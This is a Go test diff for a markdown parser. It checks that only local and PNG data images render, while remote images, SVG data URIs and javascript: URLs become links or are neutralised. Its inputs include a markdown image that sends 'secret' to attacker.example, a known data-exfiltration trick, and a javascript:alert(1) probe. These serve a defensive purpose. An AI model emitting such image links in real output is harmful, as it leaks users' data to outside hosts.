@@ -196,3 +196,23 @@ func TestReferencesCarryOver(t *testing.T) {
 		}
 	}
 }
+
+func TestOnlyLocalImagesRender(t *testing.T) {
+	for _, c := range []struct{ source, want string }{
+		{"![pic](file:///user_uploads/a.png)\n", "<p><img src=\"file:///user_uploads/a.png\" alt=\"pic\"></p>\n"},
+		{"![dot](data:image/png;base64,AAAA)\n", "<p><img src=\"data:image/png;base64,AAAA\" alt=\"dot\"></p>\n"},
+		{"![x](https://attacker.example/x?d=secret)\n", "<p><a href=\"https://attacker.example/x?d=secret\">x</a></p>\n"},
+		{"![*bold* x](https://a.example/p.png \"t\")\n", "<p><a href=\"https://a.example/p.png\" title=\"t\"><em>bold</em> x</a></p>\n"},
+		{"![](https://a.example/p.png)\n", "<p><a href=\"https://a.example/p.png\">https://a.example/p.png</a></p>\n"},
+		{"![svg](data:image/svg+xml;base64,AAAA)\n", "<p><a href=\"\">svg</a></p>\n"},
+		{"![js](javascript:alert(1))\n", "<p><a href=\"\">js</a></p>\n"},
+	} {
+		var got strings.Builder
+		s := NewParser(func(block []byte) { got.Write(block) })
+		s.Write(c.source)
+		s.Close()
+		if got.String() != c.want {
+			t.Errorf("%q: got %q, want %q", c.source, got.String(), c.want)
+		}
+	}
+}
